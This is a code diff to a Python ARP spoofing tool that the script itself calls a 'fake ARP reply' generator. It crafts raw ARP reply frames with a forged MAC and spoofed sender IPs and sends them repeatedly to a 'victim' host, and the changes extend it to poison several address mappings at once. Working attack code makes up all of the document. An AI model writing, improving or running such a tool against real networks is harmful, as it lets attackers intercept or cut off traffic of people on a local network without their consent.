@@ -16,9 +16,11 @@ class ARP:
 
     def getarg(self):
         parser = argparse.ArgumentParser(description='Generator fake ARP reply')
-        parser.add_argument('sourceip', type=str, help='Source IP address')
-        parser.add_argument('destip', type=str, help='Destination IP addr')
+        #parser.add_argument('sourceip', type=str, help='Source (you) IP address')
+        parser.add_argument('destip', type=str, help='Destination (victim) IP addr')
         parser.add_argument('changip', type=str, help='IP address for replace MAC')
+        parser.add_argument('-listvaddr', type=str, nargs='+', help='list destination IP addrs')
+        parser.add_argument('-iface', type=str, help='Set you interface (eth0)', default='eth0')
         parser.add_argument('-fakemac', type=str, help='Fake MAK for replace (de:ad:be:ef:ba:be)', default='de:ad:be:ef:ba:be')
         parser.add_argument('-time', type=int, help='Time', default=1)
         for key, val in vars(parser.parse_args()).items():
@@ -31,7 +33,16 @@ class ARP:
                     temp = val.split('.')
                     self.__dict__[key] = [int(temp[i], 0) for i in range(0, len(temp))]
                 except Exception:
-                    self.__dict__[key] = int(val)
+                    if (key == 'listvaddr' and val != None):
+                        dicto = []
+                        for i in range(0, len(val)):
+                            temp = val[i].split('.')
+                            dicto.append([int(temp[i], 0) for i in range(0, len(temp))])
+                            self.__dict__[key] = dicto
+                    elif (key == 'time'):
+                        self.__dict__[key] = int(val)
+                    else:
+                        self.__dict__[key] = val
             self.__dict__[f'str{key}'] = val
             # print(self.__dict__[key])
         self.getdestmac()
@@ -60,34 +71,43 @@ class ARP:
             self.locmac.insert(0, int('00', 16))
         # print(f'Local MAC: {self.locmac}')
 
-    def fakearp(self):
+    def fakearp(self, list = None):
         # raw socket create
         sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-        sock.bind(('eth0', 0))
+        sock.bind((self.iface, 0))
         chan_ip = [192, 168, 1, 1]
         fake_mak = [222, 173, 190, 239, 186, 190]
         nulls = [0x00 for i in range(0, 18)]
-        ARP_FRAME = [
-            struct.pack('!6B', *self.destmac),   # DESTINATION MAC ADDRESS
-            struct.pack('!6B', *self.locmac),  # SOURCE MAC ADDRESS
-            struct.pack('!H', 0x0806),      # 0X0806 IS A ARP TYPE
-            struct.pack('!H', 0x0001),      # 0X0001 IS A ETHERNET HW TYPE
-            struct.pack('!H', 0x0800),      # 0X0800 IS A IPV4 PROTOCOL
-            struct.pack('!B', 0x06),        # 0X06 HW SIZE (MAC)
-            struct.pack('!B', 0x04),        # 0X04 PROTOCOL SIZE (IP)
-            struct.pack('!H', 0x0002),      # 0x0002 IS A ARP REPLY
-            struct.pack('!6B', *self.fakemac),   # SENDER MAC
-            struct.pack('!4B', *self.changip),    # SENDER IP
-            struct.pack('!6B', *self.destmac),  # TARGET MAC
-            struct.pack('!4B', *self.destip),    # TARGET IP
-            struct.pack('!18B', *nulls)
-        ]                                   # 42 bytes, need 60
+        ARP_FRAMES = []
+        for changip in list:
+            ARP_FRAMES.append([
+                struct.pack('!6B', *self.destmac),   # DESTINATION MAC ADDRESS
+                struct.pack('!6B', *self.locmac),  # SOURCE MAC ADDRESS
+                struct.pack('!H', 0x0806),      # 0X0806 IS A ARP TYPE
+                struct.pack('!H', 0x0001),      # 0X0001 IS A ETHERNET HW TYPE
+                struct.pack('!H', 0x0800),      # 0X0800 IS A IPV4 PROTOCOL
+                struct.pack('!B', 0x06),        # 0X06 HW SIZE (MAC)
+                struct.pack('!B', 0x04),        # 0X04 PROTOCOL SIZE (IP)
+                struct.pack('!H', 0x0002),      # 0x0002 IS A ARP REPLY
+                struct.pack('!6B', *self.fakemac),   # SENDER MAC
+                struct.pack('!4B', *changip),    # SENDER IP
+                struct.pack('!6B', *self.destmac),  # TARGET MAC
+                struct.pack('!4B', *self.destip),    # TARGET IP
+                struct.pack('!18B', *nulls)
+            ])                              # 42 bytes, need 60
         for i in range(0, self.time):
-            sock.send(b''.join(ARP_FRAME))
+            for ARP_FRAME in ARP_FRAMES:
+                sock.send(b''.join(ARP_FRAME))
             time.sleep(1)
         sock.close()
 
 
 if __name__ == '__main__':
     arp = ARP()
-    arp.fakearp()
+    if(arp.listvaddr != None):
+        list = arp.listvaddr;
+        list.append(arp.changip)
+        print(list)
+        arp.fakearp(arp.listvaddr)
+    else:
+        arp.fakearp([arp.changip])
